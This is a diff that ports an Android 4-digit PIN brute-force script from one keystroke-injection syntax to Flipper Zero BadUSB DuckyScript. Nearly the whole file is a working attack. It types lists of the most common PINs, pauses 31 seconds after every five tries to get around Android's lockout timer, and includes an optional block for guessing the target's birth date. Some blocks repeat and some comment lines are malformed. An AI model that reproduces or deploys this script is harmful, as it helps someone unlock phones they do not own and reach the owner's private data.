@@ -1,328 +1,449 @@
-//Android Password Brute Force - 4 digit pin
-//07 APR 2021
-//Every 5th attempt the retry waits to work around the 30s timeout Android implements after 5 failed login attempts
-//Uncomment bottom of script for DOB options
-//Average completion time of script is 12m
-//An exhaustive wordlist is not used because A) it is not assumed device has healthy battery B) time/power constraints of healthy battery
-//Tested on Android 4.4
-//Author: defplex.wordpress.com
-//***USE AT OWN RISK***
+REM Android Password Brute Force - 4 digit pin
+REM Every 5th attempt the retry waits to work around the 30s timeout Android implements after 5 failed login attempts
+REM Uncomment bottom of script for DOB options
+REM Average completion time of script is 12m
+REM An exhaustive wordlist is not used because A) it is not assumed device has healthy battery B) time/power constraints of healthy battery
+REM Tested on Android 4.4
+REM Author: defplex.wordpress.com
+REM Modified for Flipper Zero by rf-bandit
+REM ***USE AT OWN RISK***
 
-//top 65 common pins
-typingSpeed(50,100)
-waitLED(ANY_OR_NONE);
-moveStepped(500,0);
-delay(500);
-type("1234\n");
-delay(500);
-type("4321\n");
-delay(500);
-type("1111\n");
-delay(500);
-type("2222\n");
-delay(500);
-type("3333\n");
-delay(500);
-type("x\n");
-delay(31000);
+REM top 65 common pins
 
-moveStepped(500,0);
-delay(500);
-type("4444\n");
-delay(500);
-type("5555\n");
-delay(500);
-type("6666\n");
-delay(500);
-type("7777\n");
-delay(500);
-type("8888\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1234
+ENTER
+DELAY 500
+STRING 4321 
+ENTER
+DELAY 500
+STRING 1111 
+ENTER
+DELAY 500
+STRING 2222 
+ENTER
+DELAY 500
+STRING 3333 
+ENTER
+DELAY 500
+STRING x
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("9999\n");
-delay(500);
-type("1212\n");
-delay(500);
-type("1004\n");
-delay(500);
-type("2000\n");
-delay(500);
-type("6969\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 4444
+ENTER
+DELAY 500
+STRING 5555
+ENTER
+DELAY 500
+STRING 6666 
+ENTER
+DELAY 500
+STRING 7777 
+ENTER
+DELAY 500
+STRING 8888 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1122\n");
-delay(500);
-type("1313\n");
-delay(500);
-type("0000\n");
-delay(500);
-type("2001\n");
-delay(500);
-type("1010\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 9999 
+ENTER
+DELAY 500
+STRING 1212 
+ENTER
+DELAY 500
+STRING 1004 
+ENTER
+DELAY 500
+STRING 2000 
+ENTER
+DELAY 500
+STRING 6969 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("2580\n");
-delay(500);
-type("1818\n");
-delay(500);
-type("1230\n");
-delay(500);
-type("1984\n");
-delay(500);
-type("1986\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1122 
+ENTER
+DELAY 500
+STRING 1313 
+ENTER
+DELAY 500
+STRING 0000 
+ENTER
+DELAY 500
+STRING 2001 
+ENTER
+DELAY 500
+STRING 1010 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1985\n");
-delay(500);
-type("1000\n");
-delay(500);
-type("1231\n");
-delay(500);
-type("1987\n");
-delay(500);
-type("1999\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 2580 
+ENTER
+DELAY 500
+STRING 1818 
+ENTER
+DELAY 500
+STRING 1230 
+ENTER
+DELAY 500
+STRING 1984 
+ENTER
+DELAY 500
+STRING 1986 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("2468\n");
-delay(500);
-type("2002\n");
-delay(500);
-type("2323\n");
-delay(500);
-type("1123\n");
-delay(500);
-type("1233\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1985 
+ENTER
+DELAY 500
+STRING 1000 
+ENTER
+DELAY 500
+STRING 1231 
+ENTER
+DELAY 500
+STRING 1987 
+ENTER
+DELAY 500
+STRING 1999 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1357\n");
-delay(500);
-type("1221\n");
-delay(500);
-type("1324\n");
-delay(500);
-type("1988\n");
-delay(500);
-type("2112\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 2468 
+ENTER
+DELAY 500
+STRING 2002 
+ENTER
+DELAY 500
+STRING 2323 
+ENTER
+DELAY 500
+STRING 1123 
+ENTER
+DELAY 500
+STRING 1233 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1004\n");
-delay(500);
-type("2021\n");
-delay(500);
-type("5150\n");
-delay(500);
-type("1024\n");
-delay(500);
-type("1112\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1357 
+ENTER
+DELAY 500
+STRING 1221 
+ENTER
+DELAY 500
+STRING 1324 
+ENTER
+DELAY 500
+STRING 1988 
+ENTER
+DELAY 500
+STRING 2112 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1004\n");
-delay(500);
-type("2021\n");
-delay(500);
-type("5150\n");
-delay(500);
-type("1024\n");
-delay(500);
-type("1112\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1004 
+ENTER
+DELAY 500
+STRING 2021 
+ENTER
+DELAY 500
+STRING 5150 
+ENTER
+DELAY 500
+STRING 1024 
+ENTER
+DELAY 500
+STRING 1112 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1224\n");
-delay(500);
-type("1969\n");
-delay(500);
-type("1225\n");
-delay(500);
-type("1235\n");
-delay(500);
-type("1982\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1004 
+ENTER
+DELAY 500
+STRING 2021 
+ENTER
+DELAY 500
+STRING 5150 
+ENTER
+DELAY 500
+STRING 1024 
+ENTER
+DELAY 500
+STRING 1112 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1001\n");
-delay(500);
-type("7410\n");
-delay(500);
-type("1020\n");
-delay(500);
-type("1223\n");
-delay(500);
-type("1029\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1224 
+ENTER
+DELAY 500
+STRING 1969 
+ENTER
+DELAY 500
+STRING 1225 
+ENTER
+DELAY 500
+STRING 1235 
+ENTER
+DELAY 500
+STRING 1982 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-moveStepped(500,0);
-delay(500);
-type("1515\n");
-delay(500);
-type("1213\n");
-delay(500);
-type("2345\n");
-delay(500);
-type("2424\n");
-delay(500);
-type("2525\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1001 
+ENTER
+DELAY 500
+STRING 7410 
+ENTER
+DELAY 500
+STRING 1020 
+ENTER
+DELAY 500
+STRING 1223 
+ENTER
+DELAY 500
+STRING 1029 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-//Set dervived from the most commonly appearing digits over an average of 1000 most used pins (0123)
-moveStepped(500,0);
-delay(500);
-type("0123\n");
-delay(500);
-type("1023\n");
-delay(500);
-type("1203\n");
-delay(500);
-type("3210\n");
-delay(500);
-type("2112\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 1515 
+ENTER
+DELAY 500
+STRING 1213 
+ENTER
+DELAY 500
+STRING 2345 
+ENTER
+DELAY 500
+STRING 2424 
+ENTER
+DELAY 500
+STRING 2525 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000
+ENTER
 
-moveStepped(500,0);
-delay(500);
-type("2121\n");
-delay(500);
-type("1320\n");
-delay(500);
-type("3110\n");
-delay(500);
-type("2111\n");
-delay(500);
-type("0321\n");
-delay(500);
-type("x\n");
-delay(31000);
+REM Set dervived from the most commonly appearing digits over an average of 1000 most used pins (0123)
 
-//Including the 5 least used pins to factor in target having some OpSec
-moveStepped(500,0);
-delay(500);
-type("8068\n");
-delay(500);
-type("8093\n");
-delay(500);
-type("6835\n");
-delay(500);
-type("9629\n");
-delay(500);
-type("7637\n");
-delay(500);
-type("x\n");
-delay(31000);
+ENTER
+DELAY 500
+STRING 0123 
+ENTER
+DELAY 500
+STRING 1023 
+ENTER
+DELAY 500
+STRING 1203 
+ENTER
+DELAY 500
+STRING 3210 
+ENTER
+DELAY 500
+STRING 2112 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000 
 
-//Last ditch effort with 4 sets of randomly generated pins
-moveStepped(500,0);
-delay(500);
-type("6364\n");
-delay(500);
-type("6364\n");
-delay(500);
-type("6260\n");
-delay(500);
-type("8647\n");
-delay(500);
-type("0420\n");
-delay(500);
-type("x\n");
-delay(31000);
+DELAY 500
+STRING 2121 
+ENTER
+DELAY 500
+STRING 1320 
+ENTER
+DELAY 500
+STRING 3110 
+ENTER
+DELAY 500
+STRING 2111 
+ENTER
+DELAY 500
+STRING 0321 
+ENTER
+DELAY 500
+STRING x 
+ENTER
+DELAY 31000
+ENTER
 
-moveStepped(500,0);
-delay(500);
-type("8880\n");
-delay(500);
-type("8631\n");
-delay(500);
-type("1121\n");
-delay(500);
-type("2996\n");
-delay(500);
-type("6685\n");
-delay(500);
-type("x\n");
-delay(31000);
+REMIncluding the 5 least used pins to factor in target having some OpSec
 
-moveStepped(500,0);
-delay(500);
-type("9371\n");
-delay(500);
-type("3417\n");
-delay(500);
-type("9826\n");
-delay(500);
-type("2621\n");
-delay(500);
-type("8431\n");
-delay(500);
-type("x\n");
-delay(31000);
+ENTER
+DELAY 500
+STRING 8068 
+ENTER 
+DELAY 500
+STRING 8093 
+ENTER 
+DELAY 500
+STRING 6835 
+ENTER 
+DELAY 500
+STRING 9629 
+ENTER 
+DELAY 500
+STRING 7637 
+ENTER 
+DELAY 500
+STRING x 
+ENTER 
+DELAY 31000
+ENTER 
 
-moveStepped(500,0);
-delay(500);
-type("1185\n");
-delay(500);
-type("2281\n");
-delay(500);
-type("5519\n");
-delay(500);
-type("8657\n");
-delay(500);
-type("6435\n");
-delay(500);
-type("x\n");
-delay(31000);
+REM Last ditch effort with 4 sets of randomly generated pins
 
-//If DOB for target is known uncomment and replace xxxx with MMDD, DDMM or YYYY
-//Left at end of script on purpose to keep everything in groups of 5
-//moveStepped(500,0);
-//delay(500);
-//type("xxxx\n");
-//delay(500);
-//type("xxxx\n");
-//delay(500);
-//type("xxxx\n");
-//delay(500);
-//type("x\n");
+ENTER 
+DELAY 500
+STRING 6364 
+ENTER 
+DELAY 500
+STRING 6364 
+ENTER 
+DELAY 500
+STRING 6260 
+ENTER 
+DELAY 500
+STRING 8647 
+ENTER 
+DELAY 500
+STRING 0420 
+ENTER 
+DELAY 500
+STRING x 
+ENTER 
+DELAY 31000
+ENTER 
+
+
+ENTER 
+DELAY 500
+STRING 8880 
+ENTER 
+DELAY 500
+STRING 8631 
+ENTER 
+DELAY 500
+STRING 1121 
+ENTER 
+DELAY 500
+STRING 2996 
+ENTER 
+DELAY 500
+STRING 6685 
+ENTER 
+DELAY 500
+STRING x 
+ENTER 
+DELAY 31000
+ENTER 
+
+
+ENTER 
+DELAY 500
+STRING 9371 
+ENTER 
+DELAY 500
+STRING 3417 
+ENTER 
+DELAY 500
+STRING 9826 
+ENTER 
+DELAY 500
+STRING 2621 
+ENTER 
+DELAY 500
+STRING 8431 
+ENTER 
+DELAY 500
+STRING x 
+ENTER 
+DELAY 31000
+ENTER 
+
+
+ENTER 
+DELAY 500
+STRING 1185 
+ENTER 
+DELAY 500
+STRING 2281 
+ENTER 
+DELAY 500
+STRING 5519 
+ENTER 
+DELAY 500
+STRING 8657 
+ENTER 
+DELAY 500
+STRING 6435 
+ENTER 
+DELAY 500
+STRING x 
+ENTER 
+DELAY 31000
+ENTER 
+
+REM If DOB for target is known uncomment and replace xxxx with MMDD, DDMM or YYYY
+REM Left at end of script on purpose to keep everything in groups of 5
+
+REM DELAY 500
+REM STRING xxxx 
+ENTER 
+REM DELAY 500
+REM STRING xxxx 
+ENTER 
+REM DELAY 500
+REM STRING xxxx 
+ENTER 
+REM DELAY 500
+REM STRING x 
 
